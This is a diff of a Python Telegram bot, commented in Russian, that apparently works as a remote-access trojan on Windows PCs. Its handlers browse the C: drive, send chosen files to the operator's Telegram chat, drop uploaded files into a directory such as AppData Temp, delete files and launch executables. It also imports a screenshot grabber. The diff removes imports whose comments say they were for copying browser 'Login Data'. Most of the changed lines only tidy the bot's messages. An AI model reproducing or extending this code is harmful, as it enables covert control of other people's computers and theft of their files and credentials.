@@ -2,10 +2,6 @@ import telebot # Для работы с ботом
 import os # Для работы с директориями / файлами
 import requests # Для отправки документов / скринов
 from PIL import ImageGrab # Для получения скриншота
-import shutil # Для копирования файлов Login Data
-import subprocess # Для завершения процесса
-import platform # Для получения информации о ПК
-import webbrowser # Для открытия ссылки в браузере
 import socket
 from telebot import types
 
@@ -46,7 +42,7 @@ def check_start(message):
 
 @bot.message_handler(commands=['check_dir'])
 def check_start(message):
-    msg = bot.send_message(message.chat.id, 'Начем с начала в C: \n'+ str(os.listdir('C:/')) + '\n \n Введи следущюю директорию например C:/brawl/brawl.exe! Что-бы выйти пропиши /stop_dir')
+    msg = bot.send_message(message.chat.id, 'Начем с начала в C: \n'+ str(os.listdir('C:/')) + '\n \n Введи следущюю директорию например C:/low/high.exe! Что-бы выйти пропиши /stop_dir')
     bot.register_next_step_handler(msg, check_cotegory)
 
 def check_cotegory(message):
@@ -58,7 +54,7 @@ def check_cotegory(message):
             msg1 = bot.send_message(message.chat.id, 'В директории '+ dir +' есть: '+ str(os.listdir(dir)) + '\n \n Введи следущюю директорию ')
             bot.register_next_step_handler(msg1, check_cotegory)
         except:
-            msg1 = bot.send_message(message.chat.id, 'Даун! Такой директории нет, введи ещё раз дерикторю')
+            msg1 = bot.send_message(message.chat.id, 'Такой директории нет, введи ещё раз дерикторю')
             bot.register_next_step_handler(msg1, check_cotegory)
 
 @bot.message_handler(commands=['delete_file'])
@@ -89,7 +85,7 @@ def cd_dir(message):
 
 @bot.message_handler(commands=['download_file'])
 def download_file_info(message):
-    msg = bot.send_message(message.chat.id, 'Введи директорию на файл, например: C:/brawl/brawl.mp4')
+    msg = bot.send_message(message.chat.id, 'Введи директорию на файл, например: C:/take/music.mp4')
     bot.register_next_step_handler(msg, download_file)
 
 
@@ -107,7 +103,7 @@ def download_file(message):
             bot.send_document(message.chat.id, data)
             data.close()
     except:
-        bot.send_message(message.chat.id, 'Даун, такого файла нет')
+        bot.send_message(message.chat.id, 'такого файла нет')
 
 @bot.message_handler(commands=['delete_file'])
 def isfile(message):
@@ -126,7 +122,7 @@ def del_file(message):
 @bot.message_handler(commands=['unloud_file'])
 def unloud_file_wath_dir(message):
     msg = bot.send_message(message.chat.id,
-                           'Введи дерикторию куда будут закачены файлы например C:/Users/Хуйня_зависит_от_пк/AppData/Local/Temp')
+                           'Введи дерикторию куда будут закачены файлы например C:/Users/AppData/Local/Temp')
     bot.register_next_step_handler(msg, unloud_file_wath_file)
 
 
@@ -150,7 +146,7 @@ def unloud_file(message):
         with open(src, 'wb') as new_file:
             new_file.write(downloaded_file)
 
-        bot.reply_to(message, "Успешно! файл был сахронен в директории " + dire)
+        bot.reply_to(message, "Успешно! файл был сохронен в директории " + dire)
     except Exception as e:
         bot.reply_to(message, e)
 
@@ -165,7 +161,7 @@ def start_process(message):
         os.startfile(dir_process)
         bot.send_message(message.chat.id, 'Процесс успешно запущен')
     except:
-        bot.send_message(message.chat.id, 'Даун, такого процесса или exe-шника нет!!!')
+        bot.send_message(message.chat.id, 'Такого процесса или exe-шника нет!!!')
 
 @bot.message_handler(commands = ["About", "about"]) # ОПИСАНИЕ
 def about(commands):
